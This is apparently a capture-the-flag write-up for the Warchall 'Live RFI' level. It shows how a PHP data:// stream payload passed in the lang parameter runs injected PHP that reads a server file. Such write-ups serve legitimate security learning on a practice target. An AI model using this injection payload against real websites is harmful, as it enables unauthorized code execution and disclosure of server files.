# Level 15 :
---
# _Warchall : Live RFI_
---
---
In this level 15 of this chapiter RFI, it's a little bit the same concept as the level 14 (FLI). In this case I choose to do some reseach on RFI (Remote File Inclusion) vulnerability and find a way ho to solve the problem.

We use the same principe as the level 14. So, we play first with the url of the web site as we did in level14. So after clicking the flag on the web site I tryed to type ```https://rfi.warchall.net/index.php?lang=solution.php```and got a message saying <<_NOTHING HERE????_>>.
So I read some documentation.

In this level, we will use what is called "_data stream_".
The main syntax is : ```htpps://..../data://text/plain,<?php echo "command" ?>```
So here, our command will be ```file_get_contents("solution.php")```
So in the URL do this following instruction :
```https://rfi.warchall.net/index.php?lang=data://text/plain,<?php echo file_get_contents("solution.php"); ?>```
Then, view the source code of this page. There you go ! Did it!
